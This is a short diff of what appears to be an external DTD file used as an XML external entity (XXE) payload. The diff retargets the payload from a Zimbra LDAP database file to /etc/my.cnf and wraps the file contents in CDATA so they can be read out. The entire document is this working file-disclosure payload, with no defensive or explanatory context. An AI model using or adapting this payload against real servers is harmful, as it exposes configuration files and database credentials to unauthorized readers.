@@ -1,1 +1,1 @@
-<!ENTITY % file SYSTEM "file:///opt/zimbra/data/ldap/mdb/db/lock.mdb"><!ENTITY % start "<![CDATA["><!ENTITY % end "]]>"><!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
+<!ENTITY % file SYSTEM "file:///etc/my.cnf"><!ENTITY % start "<![CDATA["><!ENTITY % end "]]>"><!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
